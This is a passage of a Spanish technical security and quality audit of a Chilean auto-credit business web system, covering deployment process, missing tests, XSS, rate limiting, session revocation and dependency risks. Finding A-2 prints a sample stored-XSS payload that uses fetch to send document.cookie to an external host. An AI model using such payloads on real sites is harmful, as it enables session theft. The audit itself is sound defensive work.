# Certificación Pre-Producción
## Informe de Auditoría Técnica Integral — AutoFácil Business Suite

**Fecha:** 3 de agosto de 2026
**Versión auditada:** v171.4 · rama `main` · commit `b83319b7`
**Alcance:** 461 archivos JavaScript · 275 páginas HTML · 39 servicios · 1.272 endpoints · 374 tablas · ~135.000 líneas
**Base documental consultada:** `CLAUDE.md`, `docs/qa-plan-produccion.md`, `docs/plan-staging-prod.md`, `docs/RUNBOOK-contingencia-bd.md`, Documentación Técnica y de Procesos del sistema

---

# 0. Cómo leer este informe

## 0.1 La premisa que hay que corregir primero

Este documento se llama "Pre-Producción", pero conviene decir la verdad de entrada:
**el sistema ya está en producción.** Opera todos los días con dinero real, clientes reales
y contabilidad real. Lo que no existe es el **proceso formal** que separa lo que se
desarrolla de lo que usan las personas: hoy `git push origin main` deposita el código
directamente frente al usuario, sin ambiente intermedio.

Esa es, sin adornos, la conclusión central de esta auditoría. No hay una falla técnica
espectacular esperando explotar: hay un **modelo operativo sin red de seguridad**, y lo que
esta auditoría hace es medir cuánta red falta y en qué orden ponerla.

## 0.2 Alcance real — qué se hizo y qué no

Auditar 135.000 líneas línea por línea no cabe en una sesión. Prefiero decirlo antes que
entregar una falsa sensación de cobertura total.

**Se hizo, con evidencia verificable (archivo, línea, consulta o prueba ejecutada):**

| Técnica | Cobertura |
|---|---|
| Búsqueda dirigida por clase de vulnerabilidad (SQLi, XSS, path traversal, upload, IDOR, secretos) | 100% del código |
| Lectura profunda de cada coincidencia sospechosa | ~60 archivos |
| Revisión de autenticación y autorización endpoint por endpoint | 1.272 rutas |
| Consultas de verificación contra la base de datos de producción | 40+ consultas |
| Análisis de integridad referencial | 8 relaciones críticas |
| `npm audit` sobre dependencias de producción | 15 paquetes |
| Prueba de concepto ejecutada (inyección SQL) | 1 |
| Pruebas de arranque del gateway tras cada cambio | 2 |
| Contraste contra la documentación técnica interna | 5 documentos |

**No se hizo — queda explícitamente pendiente:**

- Revisión línea por línea de las 275 páginas HTML (el XSS se cubrió por búsqueda dirigida
  sobre los campos de texto libre, que es donde vive el riesgo real).
- Pruebas dinámicas (DAST) contra el sistema corriendo. Todo es análisis estático más
  consultas a la BD.
- Verificación funcional de la lógica de negocio de los 39 servicios. Eso es exactamente
  lo que cubre `docs/qa-plan-produccion.md`, que es un plan de pruebas manuales y **no
  sustituye ni es sustituido por** esta auditoría: aquel prueba que el sistema *haga* lo
  correcto; este revisa que esté *construido* de forma segura y mantenible.
- Auditoría de accesibilidad con herramientas (axe, Lighthouse). Solo muestreo manual.
- Pruebas de carga y estrés.

## 0.3 Relación con los documentos que ya existen

El sistema ya tiene tres documentos que cubren partes de esto. **Este informe no los
reemplaza**, los complementa y en un punto los corrige:

| Documento | Qué cubre | Relación con esta auditoría |
|---|---|---|
| `docs/qa-plan-produccion.md` | 150+ casos de prueba funcional, con prioridad P0/P1/P2 | Complementario. Ese valida comportamiento; este valida construcción. **Los dos son necesarios para certificar.** |
| `docs/plan-staging-prod.md` | Plan de separación staging/producción en 5 fases | **Vigente y sin ejecutar.** Verificado: `process.env.ENTORNO` no existe en el código, así que la Fase 4 (blindajes) no está implementada. Esta auditoría eleva su prioridad a bloqueante. |
| `docs/RUNBOOK-contingencia-bd.md` | Contingencia de base de datos, con restauración probada | Sólido. Su propio hueco declarado (no hay host alternativo si Render cae) se confirma y se cuantifica acá. |
| Documentación Técnica del sistema | Arquitectura, tablas, motores, integraciones | Excelente y muy actualizada. **Un desfase detectado:** declara "Pendiente: runner central (capataz) que serialice las migraciones", pero `shared/migrate.js` ya existe y está en uso. Corregir. |

---

# 1. Veredicto ejecutivo

## 1.1 Estado general

**El sistema es apto para operar, y de hecho opera bien.** La calidad de construcción es
superior a lo que su tamaño, velocidad de desarrollo y origen (un solo desarrollador
asistido) harían esperar. Los fundamentos están bien puestos:

- Sin secretos en el repositorio. `JWT_SECRET` obligatorio al arranque, o el proceso no parte.
- Contraseñas con bcrypt (coste 10).
- Consultas parametrizadas en prácticamente todo el sistema.
- Seis cabeceras de seguridad, HSTS incluido.
- Errores 500 sanitizados hacia el cliente, con detalle solo al log y alerta por correo.
- Matriz de permisos por funcionalidad (`requireFunc`) bien diseñada, con caché y bypass de
  administrador, en vez de nombres de perfil incrustados en el código.
- Integridad referencial **impecable**: cero huérfanos en las ocho relaciones críticas
  verificadas, pese a que la base declara solo 8 claves foráneas sobre 374 tablas. La
  disciplina del código está sosteniendo lo que la estructura no exige.
- Máximas de diseño (motor único, fuente única, todo se contabiliza) que no son eslóganes:
  se verifican cumplidas en la mayor parte del código.

## 1.2 Lo que impide certificar hoy

Cuatro cosas. Ninguna es un defecto de programación: son ausencias de proceso e infraestructura.

1. **No existe ambiente de pruebas.** Cada cambio se estrena con los usuarios adentro.
2. **No existe una sola prueba automatizada.** En un sistema que liquida comisiones y arma
   contabilidad, cada regresión se descubre por sus efectos sobre el dinero.
3. **El Modo Desarrollo falla en abierto.** Si la base de datos parpadea, el sistema empieza
   a mandar correos y WhatsApp a clientes reales sin que nadie lo note.
4. **No hay dónde correr la aplicación si Render cae.** Ya está declarado en el runbook; sigue abierto.

## 1.3 Distribución de hallazgos

| Severidad | Cantidad | Definición |
|---|---:|---|
| 🔴 **Bloqueante** | 4 | Impide certificar la salida a producción formal |
| 🟠 **Alto** | 9 | Debe resolverse antes o inmediatamente después del go-live |
| 🟡 **Medio** | 14 | Deuda real que degrada seguridad, costo o mantenibilidad |
| 🔵 **Bajo** | 11 | Calidad y prolijidad |
| ✅ **Cerrado hoy** | 5 | Corregidos y desplegados durante esta auditoría |

## 1.4 Veredicto

> **NO CERTIFICADO — condicional.**
>
> El sistema **puede seguir operando** (ya lo hace, correctamente). Lo que no puede
> declararse es una *salida formal a producción certificada*, porque faltan las cuatro
> condiciones de 1.2.
>
> **Camino a certificación: 3 a 4 semanas** de trabajo enfocado, sin detener la operación.
> Ninguno de los cuatro bloqueantes requiere reescribir nada.

---

# 2. Hallazgos Bloqueantes

## B-1 · El Modo Desarrollo falla en abierto: puede escribirle a clientes reales

**Ubicación:** `shared/dev-mode.js:14-30`
**Categoría:** Fallo de diseño en control de seguridad · CWE-636 (Not Failing Securely)
**Severidad: 🔴 Bloqueante**

### Qué encontré

El Modo Desarrollo es el interruptor que impide que las pruebas contacten clientes reales:
con él activo, todo correo y WhatsApp se redirige a tres casillas internas. El plan de QA lo
declara *regla de oro*: «todo lo que envíe algo a un cliente real se prueba primero con Modo
Desarrollo ACTIVO».

Ese interruptor lee su estado desde la base de datos. Y si la lectura falla:

```js
try {
  const [rows] = await pool.query("SELECT clave, valor FROM mantenimiento_config WHERE clave LIKE 'dev_%'");
  …
  _cache = { activo: m.dev_activo === '1', correos, whatsapp: … };
} catch (_) {
  _cache = { activo: false, correos: [], whatsapp: '' };   // ← se APAGA solo
}
```

El `catch` deja el modo **inactivo**. Traducido: cualquier hipo de la base de datos —una
reconexión de TiDB, un timeout, un bloqueo de tabla— **desactiva silenciosamente la
protección**, y el sistema pasa a enviar correos y WhatsApp reales a clientes reales. El
resultado se cachea, así que la ventana no es de milisegundos: dura hasta que el TTL expire.

### Por qué es bloqueante

La certificación completa (`qa-plan-produccion.md`) consiste, en buena parte, en ejercitar
motores de cobranza, campañas masivas y avisos de vencimiento *con datos reales* confiando
en este interruptor. Un fallo de base de datos durante esa semana de pruebas significa
mensajes de cobranza a clientes que no debían recibirlos. Es daño reputacional y, tratándose
de cobranza, roza la Ley 21.320.

### Cómo se corrige

Invertir el sentido de la falla: si no se puede confirmar el estado, asumir el más seguro.

```js
} catch (e) {
  console.error('[dev-mode] NO se pudo leer el estado — se asume ACTIVO por seguridad:', e.message);
  _cache = { activo: true, correos: CORREOS_FALLBACK, whatsapp: '' };
  _ts = Date.now() - TTL + 5000;   // reintentar pronto, no cachear el fallback 10 min
}
```

Y complementarlo con la **Fase 4 del plan de staging** (`ENTORNO=staging` fuerza el modo
activo, sin depender de la base de datos). Verificado: `process.env.ENTORNO` **no existe hoy
en el código**, así que esa fase está pendiente.

**Esfuerzo:** Bajo (15 minutos el fail-safe; 2 horas la Fase 4 completa).

---

## B-2 · No existe ambiente de pruebas: `main` es producción en vivo

**Ubicación:** modelo de despliegue (`package.json`, `.github/workflows/`, `docs/plan-staging-prod.md`)
**Categoría:** Proceso / DevOps
**Severidad: 🔴 Bloqueante**

### Qué encontré

- Una sola rama operativa (`main`) y un solo servicio en Render.
- `git push origin main` → despliegue automático a producción en 2-3 minutos.
- Un único workflow de CI (`backup-bd.yml`, respaldo nocturno). **No hay lint, ni build, ni
  pruebas, ni verificación alguna antes de desplegar.**
- Sin protección de rama: nada impide un push directo.
- El plan de separación existe y está bien pensado (`docs/plan-staging-prod.md`, 5 fases,
  costo adicional estimado US$0), pero está **agendado desde el 04-07-2026 y sin ejecutar**.

Durante esta misma sesión de trabajo se desplegaron **cinco versiones a producción**
(v171.0 → v171.4), incluyendo cambios en rutas de autorización y en el motor de digitación.
Cada una se validó ejecutando consultas contra la base de producción: funcionó, pero el
método es "probar en el paciente".

### Por qué es bloqueante

Sin ambiente intermedio no hay forma de ejecutar el plan de QA de 150 casos sin arriesgar
datos reales, ni de cumplir su propio criterio de salida («deploy congelado 48h antes del
go-live»). La certificación no es verificable.

### Cómo se corrige

Ejecutar el plan que ya está escrito, en su orden sugerido: Fase 4 (blindajes por
`ENTORNO`, se pueden commitear sin efecto en producción) → Fase 1 (rama `staging` +
protección de `main`) → Fases 2 y 3 (base y servicio espejo) → Fase 5 (disciplina).

Y agregar al CI lo mínimo que hoy no existe: `node --check` sobre los archivos cambiados y,
cuando existan, las pruebas de B-3. Un workflow de 20 líneas.

**Esfuerzo:** Medio (el plan estima 4-6 horas repartidas; el CI, 1 hora).

---

## B-3 · Cero pruebas automatizadas sobre motores que calculan dinero

**Ubicación:** todo el repositorio — `find . -name "*.test.js" -o -name "*.spec.js"` devuelve vacío
**Categoría:** Calidad / Riesgo financiero
**Severidad: 🔴 Bloqueante**

### Qué encontré

No existe ni una prueba automatizada. El sistema calcula: comisiones de ejecutivos,
comisiones de dealers, rentabilidad por operación, interés por mora, gastos de cobranza,
cuota francesa, montos de prepago, provisiones, remuneraciones y asientos contables.

Y no es un riesgo teórico. **Esta misma semana**, tres defectos de cálculo llegaron a
producción y se descubrieron por sus efectos, no por una alarma:

| Defecto | Causa raíz | Cómo se detectó |
|---|---|---|
| Primas truncadas: $320.118 → $320 | `normInt` interpretaba el punto de miles chileno como decimal | El usuario notó cifras absurdas semanas después |
| Ingreso por seguros en $0 | Consecuencia del anterior más una limpieza posterior | Revisión manual de una planilla |
| Error 500 en el cuadro de otorgados incompletos | Columna inexistente en el `SELECT` | 7 errores en producción antes del aviso |

Una sola prueba de cuatro líneas sobre `normInt("320.118") === 320118` habría evitado el
primero, que fue el más caro: dejó operaciones sin ingreso por seguros durante semanas.

### Cómo se corrige

No hace falta cobertura total ni un framework: Node trae `node --test` incorporado. Lo que
hace falta son pruebas de los **motores puros** —funciones sin base de datos, triviales de
probar y que concentran todo el riesgo financiero:

| Motor | Archivo | Casos mínimos |
|---|---|---|
| Números chilenos | `carga-trinidad.controller.js → normInt` | `"320.118"`→320118 · `"1.109.286"`→1109286 · `"1.234,56"`→1235 |
| Cuota francesa | `public/js/rentabilidad-core.js` | tasa 0 · plazo 1 · redondeo · plazo 80 |
| Interés por mora | `public/js/mora-core.js` | TMC fija al otorgar · día 20 vs día 21 (umbral de gastos) |
| Etapa del crédito | `shared/etapa-credito.js` | las tres columnas en desacuerdo → etapa canónica |
| Comisión ejecutivo | `services/comisiones` | bajo mínimo · tramo 24 exacto · campos forzados |
| Correlativo `num_op` | `shared/num-op.js` | formato AAMM#### · cambio de mes |
| RUT | `public/js/rut-core.js` | DV `K` · con y sin puntos · inválido |

Unas 25 pruebas cubren el 80% del riesgo real y corren en menos de un segundo.

**Esfuerzo:** Medio (2-3 días). **Es la inversión de mayor retorno de todo este informe.**

---

## B-4 · Sin plan de continuidad de la aplicación

**Ubicación:** infraestructura · declarado en `CLAUDE.md` y `docs/RUNBOOK-contingencia-bd.md`
**Categoría:** Continuidad operacional
**Severidad: 🔴 Bloqueante**

### Qué encontré

La contingencia de **datos** está resuelta y —esto es notable— **probada**: TiDB con respaldo
propio vía GitHub Actions (30 días de retención), instancia de Google Cloud SQL detenida
lista para levantar, y una restauración real ya ensayada, con su gotcha de claves foráneas
documentado. Eso está muy por encima del estándar de una empresa de este tamaño.

Lo que no existe es continuidad de **la aplicación**. Todo corre en un único servicio de
Render, en un único proceso Node. Si Render tiene una caída prolongada, el sistema completo
—créditos, contabilidad, cobranza, portales de cliente y dealer— queda fuera de servicio sin
destino alternativo. No hay host secundario configurado ni ensayado.

Agravante estructural: los 39 "servicios" comparten un solo proceso, y ese proceso además
sostiene **33 temporizadores de fondo** (`setInterval`) repartidos en 31 archivos: cobranza
automática, avisos de vencimiento, sincronización de indicadores, monitor de uptime,
recordatorios de RRHH. Un reinicio no solo corta la atención: reinicia todos los relojes.

### Cómo se corrige

Dos caminos legítimos, y hay que elegir uno explícitamente:

1. **Preparar un host secundario** (Railway, Fly.io o una VM), documentar sus variables de
   entorno y **ensayar un despliegue real al menos una vez**. Un plan no probado no es un
   plan — precisamente lo que enseñó el gotcha de las claves foráneas.
2. **Aceptar formalmente el riesgo**, con una decisión escrita: cuántas horas de
   indisponibilidad son tolerables y qué se le dice a los clientes mientras tanto.

Lo que no sirve es dejarlo sin decidir, que es donde está hoy.

**Esfuerzo:** Medio (1 día para ensayar el host alternativo).

---

# 3. Hallazgos Altos

## A-1 · `uncaughtException` se traga el error y deja el proceso vivo

**Ubicación:** `api-gateway/src/index.js:685-687` · **Severidad: 🟠 Alto**

```js
process.on('uncaughtException', (err) => {
  console.error('[uncaughtException]', err.stack || err.message);
});
```

El comentario dice «El servidor no debe caerse por una promesa sin catch», y para
`unhandledRejection` es una decisión defendible. Para `uncaughtException` **no lo es**: la
documentación de Node es explícita en que, tras una excepción no capturada, el proceso queda
en estado indefinido y debe terminar. Al no llamar a `process.exit`, el gateway sigue
atendiendo peticiones con el pool de conexiones posiblemente corrupto, transacciones a medio
camino y timers en estado inconsistente.

En un sistema que mueve dinero, seguir operando "como si nada" tras un fallo desconocido es
peor que reiniciar: Render reinicia en segundos y la caída queda registrada.

**Corrección:** registrar, alertar y salir con código 1; dejar que Render levante el proceso
de nuevo. Mantener el `unhandledRejection` solo registrando.

**Esfuerzo:** Bajo.

---

## A-2 · XSS almacenado: motivo de rechazo de fichas de dealer

**Ubicación:** `api-gateway/public/dealers-incorporacion/nuevo.html:999` · **CWE-79 · Severidad: 🟠 Alto**

```js
b.innerHTML = `<b>…Ficha rechazada por ${f.revisor_nombre||'Operaciones'}:</b> ${f.motivo_rechazo}`;
```

`motivo_rechazo` es texto libre que escribe un revisor de Operaciones y se inyecta **sin
escapar** en el DOM de quien abre la ficha. La misma página **tiene** una función de escape
definida; simplemente no se usa acá.

**Cómo se explota:** el revisor escribe como motivo `<img src=x onerror="fetch('https://…/?c='+document.cookie)">`.
Cuando el dealer o el ejecutivo abre su ficha rechazada, el script corre en su sesión.

Contraste que demuestra que es un descuido y no un criterio: la página hermana
`mantencion.html:360` renderiza el mismo dato **correctamente escapado** (`escH(v)`).

**Corrección:** `${escH(f.motivo_rechazo)}` y `${escH(f.revisor_nombre||'Operaciones')}`.

**Esfuerzo:** Bajo (una línea).

---

## A-3 · XSS vía Excel de terceros en el dashboard de gerencia

**Ubicación:** `api-gateway/public/dashboard/app.js:1747` y `:1755` · **CWE-79 · Severidad: 🟠 Alto**

Los rankings de Top Dealers y Top Ejecutivos interpolan `nombre` sin escapar. Ese nombre
sale de `creditos.automotora` / `creditos.ejecutivo`, que se pueblan desde los **archivos
Excel de carga masiva** — archivos que llegan desde AutoFin y Trinidad, es decir, **desde
fuera de la organización**.

**Cómo se explota:** una celda de nombre de dealer con `<img src=x onerror=…>` en el Excel
del mes. Al cargarlo, el script queda almacenado; se ejecuta cuando la gerencia abre el
dashboard — exactamente los usuarios con más privilegios del sistema.

Es la cadena completa: entrada de tercero → almacenamiento sin sanear → ejecución en el
navegador del usuario más privilegiado.

**Corrección:** aplicar `esc()` en ambos puntos (la función ya existe en el archivo).
Estructuralmente, sanear en la carga masiva **y** escapar al renderizar.

**Esfuerzo:** Bajo.

---

## A-4 · 37 de 44 variables de entorno no están documentadas

**Ubicación:** `.env.example` vs uso real en el código · **Severidad: 🟠 Alto**

El código consume **44 variables de entorno**. `.env.example` documenta **7**.

Sin documentar (extracto): `ANTHROPIC_API_KEY`, `WSP_TOKEN`, `WSP_PHONE_ID`, `WSP_VERIFY`,
`MAIL_HOST`, `MAIL_USER`, `MAIL_PASS`, `MAIL_FROM`, `MAIL_FROM_COBRANZA`, `CMF_API_KEY`,
`DEALERNET_USER/PASS/ENDPOINT/TIPOCNS`, `GOOGLE_MAPS_API_KEY`, `GOOGLE_OAUTH_*`,
`GOOGLE_SA_*`, `FINTOC_SECRET_KEY`, `SII_CERT_B64`, `SII_CERT_PASS`, `SII_CLAVE`,
`SII_RUT_EMPRESA`, `SIMPLEAPI_KEY`, `WORKERA_*`, `ALERTA_ERRORES_MAIL`, `CORS_ORIGIN`, `APP_URL`.

Además, **solo `JWT_SECRET` se valida al arranque**. El resto falta en silencio: la
funcionalidad simplemente no anda, o anda a medias, y nadie se entera hasta que un usuario
reclama. Se comprobó en vivo durante esta auditoría: al levantar el gateway sin
`CMF_API_KEY`, la sincronización de indicadores respondió `{"uf":{"error":"Falta CMF_API_KEY"}}`
—degradó con elegancia, pero solo lo vio quien miraba el log.

**Por qué es Alto ahora:** el plan de staging (B-2) exige replicar el entorno. Con 37
variables sin documentar, ese ambiente nacerá roto de formas difíciles de diagnosticar.

**Corrección:** completar `.env.example` con las 44, agrupadas y comentadas, y agregar al
arranque una verificación que liste en el log las variables ausentes clasificadas por
criticidad (crítica = no arranca; opcional = avisa y degrada).

**Esfuerzo:** Bajo (1-2 horas).

---

## A-5 · Sin límite de peticiones en el 99% de la API

**Ubicación:** `api-gateway/src/index.js:200-201` · **CWE-770 · Severidad: 🟠 Alto**

Solo tienen límite `/api/auth/login` (10/min), los endpoints públicos del portal dealer y la
API pública. Los ~1.270 endpoints restantes no tienen ninguno.

Dos agravantes propios de este sistema:

1. **TiDB cobra por consulta.** Un bucle contra reportería o el Mayor Completo no es una
   molestia: es una factura. Está documentado en la propia base de conocimiento del proyecto.
2. `CLAUDE.md` **declara la tarea como completada** (✅ «Rate limiting en el API Gateway»),
   lo que produce falsa tranquilidad. Se implementó solo para login.

**Corrección:** `app.use('/api', rateLimit({ ventanaMs: 60000, max: 300 }))` tras la
autenticación, con techos más bajos para reportería y contabilidad. Y corregir el estado en
`CLAUDE.md`, que hoy afirma algo que no es.

**Esfuerzo:** Bajo.

---

## A-6 · Sesiones no revocables: hasta 8 horas de acceso tras desvincular a alguien

**Ubicación:** `shared/middleware/auth.js:5` (`JWT_EXPIRES = '8h'`) · **CWE-613 · Severidad: 🟠 Alto**

`requireFunc` consulta `u.estado = 'activo'` en cada verificación de permiso
(`permisos.js:29`), así que al suspender a un usuario las rutas con permiso quedan cerradas
de inmediato. **Pero las ~450 rutas que solo exigen `verifyToken` siguen respondiendo**
hasta que el token expire: no hay lista de revocación ni versión de token.

Un empleado desvinculado a las 9 de la mañana conserva acceso a buena parte del sistema
—consultas de clientes, listados de créditos, exportaciones— hasta las 5 de la tarde. Lo
mismo vale para un token robado.

**Corrección:** columna `token_version` en `usuarios`, incluida en el JWT y verificada en
`verifyToken` con caché de 60 segundos (el mismo patrón que ya usa `tieneFunc`). Cambiar la
contraseña o suspender al usuario incrementa la versión e invalida todo lo emitido.

**Esfuerzo:** Medio (medio día).

---

## A-7 · `xlsx` con ReDoS sin parche, procesando archivos de terceros

**Ubicación:** `package.json` → `xlsx@0.18.5` · **Severidad: 🟠 Alto**

`npm audit` tras las correcciones de hoy: **3 vulnerabilidades** (bajamos de 7).

| Paquete | Severidad | Problema | Arreglo |
|---|---|---|---|
| `xlsx` | Alta | Prototype pollution + ReDoS | **No hay parche disponible** |
| `nodemailer` ≤9.0.0 | Alta | Lectura de archivos y SSRF vía opción `raw`; DoS en addressparser | v9 (cambio mayor) |
| `fast-xml-parser` <5.7.0 | Moderada | Inyección de comentarios XML | v5 (cambio mayor) |

`xlsx` es el crítico: **no tiene arreglo** y es justamente el que procesa los Excel que
suben los usuarios (carga masiva, Trinidad, conciliación bancaria, migración INDEXA). Un
archivo con un patrón malicioso puede colgar el proceso — y por A-1 y B-4, colgar el proceso
es colgar el sistema entero.

**Corrección:** migrar a `exceljs`, o aislar el parseo en un *worker thread* con timeout de
modo que un archivo hostil mate al worker y no al servidor.

**Esfuerzo:** Medio.

---

## A-8 · Carrera en el correlativo `num_op`

**Ubicación:** `shared/num-op.js:38-44` · **CWE-362 · Severidad: 🟠 Alto**

```js
const [[r]] = await db.query(
  'SELECT COALESCE(MAX(num_op), ?) mx FROM creditos WHERE num_op BETWEEN ? AND ?', …);
return Number(r.mx) + 1;
```

Leer el máximo y sumar uno no es atómico. Dos otorgamientos simultáneos obtienen el mismo
número; el índice único `uq_num_op` protege la integridad de los datos, pero el segundo
usuario recibe un **error 500** en mitad de otorgar un crédito, sin explicación útil.

El propio comentario del archivo asume «flujos secuenciales», sin nada que lo garantice.
Con dos personas otorgando a la vez —hoy perfectamente posible— falla.

*(Nota de transparencia: este código se escribió durante esta misma semana de trabajo.)*

**Corrección:** tabla de correlativos con `UPDATE … SET ultimo = LAST_INSERT_ID(ultimo+1)`
—atómico en MySQL/TiDB— o, como mínimo, reintento con backoff al detectar `ER_DUP_ENTRY`.

**Esfuerzo:** Bajo el reintento, Medio la tabla dedicada.

---

## A-9 · Cuatro tablas de respaldo más, fuera del patrón de limpieza

**Ubicación:** esquema de producción · **Severidad: 🟠 Alto**

La limpieza ejecutada hoy (35 → 8 tablas) buscó por prefijo `bkp_` y `tmp_`. Ese patrón
**no cazó cuatro tablas de respaldo con otra convención de nombre**, detectadas ahora al
cruzar todas las tablas contra las referencias del código:

| Tabla | Filas | Contenido |
|---|---:|---|
| `dealers_dir_backup_20260708` | 888 | Direcciones de dealers |
| `dealers_dir_backup_20260709` | 888 | Direcciones de dealers |
| `dealers_dir_backup_parques_20260709` | 888 | Direcciones de parques |
| `ctb_compras_aux_dup_bak` | 71 | Auxiliar contable de compras |
| `ia_liquidaciones` | 0 | Tabla muerta, nunca usada |

2.735 filas más de datos comerciales fuera de todo control de acceso de la aplicación, y una
tabla sin uso alguno. **Ninguna está referenciada en el código.**

**Corrección:** exportarlas al mismo ZIP y eliminarlas. Y adoptar la regla que falta: **toda
tabla de respaldo nace con prefijo `bkp_` y con fecha de caducidad**, para que un barrido por
patrón las encuentre siempre.

**Esfuerzo:** Bajo.

---

# 4. Hallazgos Medios

| # | Hallazgo | Ubicación | Evidencia e impacto |
|---|---|---|---|
| M-1 | **Dos motores de rate limiting distintos** | `shared/rate-limit.js` (35 líneas, API `ventanaMs`) y `shared/middleware/rate-limit.js` (48 líneas, API `key`/`windowMs`) | Violación directa de la Máxima 1 del propio proyecto. Dos implementaciones que hay que arreglar dos veces |
| M-2 | **Cinco implementaciones de `hoyChile()`** con tres mecanismos distintos | `rrhh.controller.js`, `automatizacion-cobranza.js`, `aviso-vencimiento.js`, `seguimiento-cartas.js`, `shared/utils/fecha-futura.js` | Verificado: hoy las cinco devuelven `2026-08-03`. Pero usan `Intl` con opciones, `Intl` por defecto, `sv-SE` y `en-CA` — coinciden por suerte, no por diseño. La fecha decide mora y vencimientos |
| M-3 | **Pago individual sin asiento contable** | `pagos-credito.controller.js:219` (`create`) | `createBatch` y `prepagar` llaman a `contabilizar()`; `create` no. Viola la Máxima 4 ("todo movimiento se contabiliza"), que es la condición declarada para reemplazar AVSOFT. Mitigante verificado: el frontend no usa esta ruta hoy — es una puerta abierta, no una fuga activa |
| M-4 | **Eliminar un pago no reversa su asiento** | `pagos-credito.controller.js:280` (`remove`) | `DELETE /api/pagos-credito/:id` borra el pago pero deja el comprobante contable en pie: la contabilidad queda descuadrada respecto de la operación |
| M-5 | **Token JWT aceptado por query string** | `shared/middleware/auth.js:12` | `?token=` queda en logs del proxy, historial del navegador y cabecera `Referer`. Justificado para descargas; debería limitarse solo a esas rutas |
| M-6 | **`JSON.parse` sin protección sobre entrada del usuario** | `bd-operaciones.controller.js:53` | Un `?filters=` malformado produce un 500 y dispara correo de alerta al administrador. Debe responder 400 |
| M-7 | **`DESCRIBE creditos` en cada petición** | `bd-operaciones.controller.js:45` | Consulta extra por cada carga de página solo para validar el nombre de columna del orden. En TiDB, cada consulta se paga. Cachear al arranque |
| M-8 | **N+1 en el panel Mi Día** | `mi-dia.controller.js:158-168` | Un `SELECT` por widget, en serie, más permisos y cumpleaños: hasta 14 consultas encadenadas por carga. `Promise.all` deja la latencia en la del widget más lento |
| M-9 | **Sin `Content-Security-Policy`** | `api-gateway/src/index.js:17-23` | Hay seis cabeceras de seguridad, falta la única que **contiene** un XSS ya presente. Con A-2 y A-3 confirmados, es la red que falta bajo el trapecio |
| M-10 | **Autorización por `esAdmin()` dentro del controlador** | `backups`, `correos-programados`, `mantenimiento` | Contradice la regla del propio proyecto ("no usar `requirePerfil` en código nuevo"): el administrador no puede delegar esas funciones desde la matriz sin tocar código |
| M-11 | **`cartas/parametros/:key` abierto por defecto** | `cartas/parametros.controller.js:40` | Si la clave no figura en `KEY_PERMISOS`, cualquier autenticado la escribe. El criterio debe ser denegar salvo permiso explícito, no al revés |
| M-12 | **Migraciones acopladas al arranque** | 39 bloques `enFila` en controladores | Cada despliegue reejecuta DDL y alarga el arranque en frío (una tardó 7,3s en la medición de hoy). Ya produjo un claim huérfano `EN_CURSO` durante 6 días, detectado ayer |
| M-13 | **Dos archivos frontend de ~5.000 líneas** | `dashboard/app.js` (4.943), `cartas-aprobacion/app.js` (4.934) | Imposibles de revisar con seguridad. `cartas-aprobacion` ya está marcado como frágil en la base de conocimiento tras haberse roto una vez |
| M-14 | **Sin documentación de API** | — | 1.272 endpoints sin contrato publicado. Cada integración obliga a leer el código fuente |

---

# 5. Hallazgos Bajos

| # | Hallazgo | Ubicación |
|---|---|---|
| B-01 | `X-XSS-Protection` está obsoleto; los navegadores modernos lo ignoran y algunos lo consideran contraproducente | `index.js:20` |
| B-02 | `Dockerfile` y `docker-compose.yml` en el repositorio, pero el despliegue es Node directo en Render: configuración muerta que confunde | raíz |
| B-03 | 23 de 256 etiquetas `<img>` sin atributo `alt` | `public/**/*.html` |
| B-04 | 238 de 1.714 campos de formulario sin `label` ni `aria-label` asociado | `public/**/*.html` |
| B-05 | Sin `code splitting` ni carga diferida: `dashboard/app.js` se descarga completo siempre | `public/dashboard/` |
| B-06 | Bloque `:root{--navy…}` repetido en las 275 páginas en vez de una hoja compartida | `public/**/*.html` |
| B-07 | 32 respuestas `res.json` sin la envoltura `{success, data, error}` que exige la convención (sobre 943) | varios |
| B-08 | Sin monitoreo estructurado de errores (Sentry o similar): solo correo al administrador con límite de frecuencia | `shared/alerta-errores.js` |
| B-09 | Scripts de operación acumulados en `scripts/` sin separación por año | `scripts/` |
| B-10 | La Documentación Técnica declara pendiente el "capataz de migraciones" que ya está implementado en `shared/migrate.js` | `tecnica.html` |
| B-11 | `lock_minutos` se interpola en SQL sin `parseInt` (hoy es columna numérica, pero es defensa en profundidad) | `campanas-ventas.controller.js:547` |

---

# 6. Análisis por dominio

## 6.1 Arquitectura — 6,5/10

**Fortalezas.** El principio anti-hardcode está genuinamente implementado y da resultados
medibles: **cero carpetas huérfanas** en `public/` sobre 275 páginas, porque módulos y
tarjetas salen de las tablas `modulos` y `funcionalidades` en vez de listas en JavaScript.
Las Máximas de diseño (motor único, fuente única, todo se contabiliza, todo se documenta) no
son decorativas: se verifican cumplidas en la mayoría del código, y las excepciones
encontradas (M-1, M-2, M-3) son puntuales.

**Debilidades.** Los 39 "servicios" son carpetas dentro de un mismo proceso Node: comparten
memoria, event loop y destino. No hay aislamiento de fallos ni escalado selectivo. Sumado a
los 33 temporizadores de fondo en ese mismo proceso, la superficie de "algo se cae y cae
todo" es amplia (B-4, A-1, A-7).

**Recomendación honesta:** *no* migrar a microservicios reales. Al volumen actual sería
sobreingeniería. Alcanza con aislar lo peligroso (parseo de Excel en worker), sacar las
migraciones del arranque y salir con dignidad ante excepciones no capturadas.

## 6.2 Seguridad — 6,5/10

Base sólida, ya descrita en 1.1. Lo que queda por cerrar: dos XSS almacenados confirmados
(A-2, A-3), ausencia de CSP (M-9), sesiones no revocables (A-6), rate limiting incompleto
(A-5) y dependencias sin parche (A-7).

**Contexto justo:** durante esta auditoría se cerró una inyección SQL real y explotable, se
cerraron dos endpoints que permitían alterar la renta de cualquier cliente y cambiar la hora
de la base de datos, y se sacaron de producción 53.311 filas de datos personales que vivían
fuera de todo control de acceso. El sistema está hoy materialmente más seguro que ayer.

## 6.3 Base de datos — 7/10

| Métrica | Valor | Lectura |
|---|---|---|
| Tablas | 374 | Alto, pero coherente con 39 módulos |
| Tabla mayor | `creditos`, 17.932 filas / 12 MB | Cómodo |
| Claves foráneas declaradas | 8 | Muy bajo |
| Huérfanos detectados | **0 en 8 relaciones críticas** | Excelente |
| Índices en tablas calientes | correctos | `creditos` tiene 10 |

La integridad se sostiene por disciplina de código, no por estructura. Funciona —y los datos
lo demuestran— pero es frágil ante un script mal escrito, que puede dejar huérfanos en
silencio. Añadir claves foráneas ahora es caro y arriesgado; la alternativa realista es un
**chequeo de integridad periódico** que corra las mismas ocho consultas de esta auditoría y
avise si alguna deja de dar cero.

Pendiente estructural conocido: la etapa del crédito vive en **tres columnas**
